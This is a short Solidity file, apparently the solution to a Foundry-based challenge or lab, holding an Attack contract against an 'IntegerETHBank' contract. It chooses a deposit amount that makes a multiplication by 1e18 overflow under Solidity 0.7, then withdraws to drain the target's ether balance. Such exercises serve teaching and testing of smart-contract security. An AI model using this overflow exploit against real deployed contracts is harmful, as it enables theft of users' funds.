// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.7.4;

import "forge-std/Test.sol";

import "../src/IntegerETHBank.sol";

contract Attack is IntegerETHBankUser {
    address public target;
    uint256 private constant MAX_UINT256 = type(uint256).max;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        IntegerETHBank(target).deposit{value: getDepositAmount() * 1e18}();
        IntegerETHBank(target).withdraw();
    }

    function getDepositAmount() public pure override returns (uint256) {
        return MAX_UINT256 / 1e18 + 1;
    }

    function getWithdrawAmount() external view override returns (uint256) {
        if (!IntegerETHBank(target).guard()) {
            return address(target).balance / 1e18;
        } else {
            return 0;
        }
    }

    receive() external payable {}
}
